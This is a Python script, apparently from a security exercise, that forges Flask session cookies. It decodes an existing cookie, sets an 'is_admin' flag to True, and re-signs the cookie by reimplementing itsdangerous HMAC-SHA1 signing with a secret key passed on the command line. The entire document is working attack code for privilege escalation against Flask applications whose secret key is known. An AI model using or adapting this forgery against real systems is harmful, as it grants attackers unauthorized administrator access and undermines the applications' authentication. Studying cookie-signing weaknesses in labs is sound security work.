"""
This script generates a flask cookie
based on tracing their cookie generation flow.
"""
import base64
import hashlib
import hmac
import sys
import time

from itsdangerous._json import _CompactJSON

FLASK_SALT = b'cookie-session'  # the salt used by flask
IS_ADMIN_KEY = 'is_admin'  # session value key we want to change

MAX_INT_BYTES = 1000  # for int.to_bytes


def base64_encode(data_to_encode: bytes) -> bytes:
    return base64.urlsafe_b64encode(data_to_encode).rstrip(b"=")


def base64_decode(data_to_decode: str) -> bytes:
    raw_data = data_to_decode.encode('ascii')
    raw_data += b"=" * (-len(raw_data) % 4)
    return base64.urlsafe_b64decode(raw_data)


def generate_flask_cookie(cookie_data: dict, flask_secret_key: bytes) -> bytes:
    """
    Generates flask cookie that encodes cookie_data and uses a secret key.
    """
    cookie_data_json = _CompactJSON.dumps(cookie_data).encode()
    cookie_payload = base64_encode(cookie_data_json)
    seperator = b'.'
    timestamp = time.time()
    encoded_timestamp = base64_encode(int(timestamp).to_bytes(length=MAX_INT_BYTES, byteorder='big').lstrip(b"\x00"))
    to_sign = cookie_payload + seperator + encoded_timestamp
    key_hash = hmac.new(flask_secret_key, digestmod=hashlib.sha1)
    key_hash.update(FLASK_SALT)
    sign_key = key_hash.digest()
    sign_hash = hmac.new(sign_key, msg=to_sign, digestmod=hashlib.sha1)
    signature = sign_hash.digest()
    encoded_signature = base64_encode(signature)
    return cookie_payload + seperator + encoded_timestamp + seperator + encoded_signature


if __name__ == "__main__":
    if len(sys.argv) != 3:
        raise Exception("Usage: flask-cookie-generator <session_cookie> <secret>")
    session_cookie = sys.argv[1]
    session_data = session_cookie.split(".")[0]
    data = base64_decode(session_data)
    cookie_dict = _CompactJSON.loads(data)
    cookie_dict[IS_ADMIN_KEY] = True
    secret = sys.argv[2].encode()
    secret_key = base64.b64decode(secret)
    flask_cookie = generate_flask_cookie(cookie_dict, secret_key)
    print(f"The flask cookie value is:\n"
          f"{str(flask_cookie)}")
